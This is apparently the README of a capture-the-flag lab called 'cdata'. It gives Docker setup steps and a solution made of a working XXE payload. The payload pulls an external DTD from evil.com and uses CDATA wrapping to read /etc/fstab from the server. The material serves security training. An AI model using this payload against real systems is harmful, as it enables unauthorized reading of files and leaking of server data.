# cdata

## Build

docker build -t "cdata" .

docker run -ti -p [PORT]:80 cdata /bin/bash

apachectl start

## Solution

```
<!DOCTYPE data [
<!ENTITY % dtd SYSTEM "http://evil.com/bad.dtd">
%dtd;
%all;
]>
<data>&f;</data>
```

bad.dtd:

```
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
```

